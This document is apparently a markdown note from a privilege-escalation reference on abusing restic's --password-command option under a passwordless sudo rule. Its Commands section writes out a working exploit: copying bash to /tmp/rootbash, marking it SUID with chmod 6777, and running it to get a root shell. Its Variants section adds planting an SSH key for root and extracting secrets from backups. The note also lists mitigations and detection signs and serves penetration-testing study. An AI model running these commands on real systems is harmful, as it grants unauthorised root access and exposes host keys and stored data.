---
topic: restic — --password-command as execution
tags: [linux, restic, backup, command-execution, privesc]
---

# restic — --password-command as execution

**English** | [🌐 Español](restic-password-command.md)

## Concept

`restic` accepts `--password-command` to obtain the repository password by running a command. If a user can run restic as root, that option runs code with root privileges, even without repository access.

## When it applies

- `sudo -l` allows `restic` without a password.
- The version supports `--password-command`.
- The command argument is controlled.

## Procedure

1. Confirm the sudoers rule.
2. Use `restic check --password-command` to copy and set SUID.
3. Run the SUID shell.
4. Read host keys or data.

## Commands

```bash
sudo restic check --password-command 'cp /bin/bash /tmp/rootbash'
sudo restic check --password-command 'chmod 6777 /tmp/rootbash'
/tmp/rootbash -p
```

## Variants

- `--password-command` on `backup`, `restore` or `snapshots`.
- Write a key to `/root/.ssh`.
- Read the backup to extract secrets.

## Limitations

- The rule may restrict subcommands.
- An old version lacks the option.
- Some commands require a repository.

## Mitigation

- Do not allow restic as root.
- Use a wrapper with fixed subcommands and paths.
- Protect the repository and credentials.

## Detection

- `--password-command` on the command line.
- SUID shells created by restic.
- Unusual access to backup repositories.

## References

- [restic — password command](https://restic.readthedocs.io/en/stable/040_backup.html#passing-the-password)
- [0xdf — WhiteRabbit](https://0xdf.gitlab.io/2025/12/13/htb-whiterabbit.html)
- [HackTricks — restic](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
